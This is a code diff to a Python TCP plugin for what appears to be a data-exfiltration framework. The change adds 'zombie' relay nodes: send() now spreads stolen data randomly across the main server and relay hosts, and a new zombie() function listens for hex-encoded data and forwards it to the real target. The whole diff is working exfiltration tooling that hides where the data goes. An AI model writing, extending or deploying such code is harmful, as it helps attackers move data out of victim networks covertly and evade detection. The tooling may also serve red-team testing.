@@ -1,12 +1,13 @@
 import socket
 import sys
+from random import choice
 
 config = None
 app_exfiltrate = None
 
-
 def send(data):
-    target = config['target']
+    targets = [config['target']] + config['zombies']
+    target = choice(targets)
     port = config['port']
     app_exfiltrate.log_message(
         'info', "[tcp] Sending {0} bytes to {1}".format(len(data), target))
@@ -15,8 +16,10 @@ def send(data):
     client_socket.send(data.encode('hex'))
     client_socket.close()
 
-
 def listen():
+    sniff(handler=app_exfiltrate.retrieve_data)
+
+def sniff(handler):
     port = config['port']
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -44,7 +47,8 @@ def listen():
                         'info', "[tcp] Received {} bytes".format(len(data)))
                     try:
                         data = data.decode('hex')
-                        app_exfiltrate.retrieve_data(data)
+                        #app_exfiltrate.retrieve_data(data)
+                        handler(data)
                     except Exception, e:
                         app_exfiltrate.log_message(
                             'warning', "[tcp] Failed decoding message {}".format(e))
@@ -53,6 +57,19 @@ def listen():
         finally:
             connection.close()
 
+def relay_tcp_packet(data):
+    target = config['target']
+    port = config['port']
+    app_exfiltrate.log_message(
+        'info', "[zombie] [tcp] Relaying {0} bytes to {1}".format(len(data), target))
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket.connect((target, port))
+    client_socket.send(data.encode('hex'))
+    client_socket.close()
+
+def zombie():
+    app_exfiltrate.log_message('info', "[zombie] [tcp] Waiting for connections...")
+    sniff(handler=relay_tcp_packet)
 
 class Plugin:
 
@@ -61,4 +78,4 @@ class Plugin:
         global app_exfiltrate
         config = conf
         app_exfiltrate = app
-        app.register_plugin('tcp', {'send': send, 'listen': listen})
+        app.register_plugin('tcp', {'send': send, 'listen': listen, 'zombie': zombie})
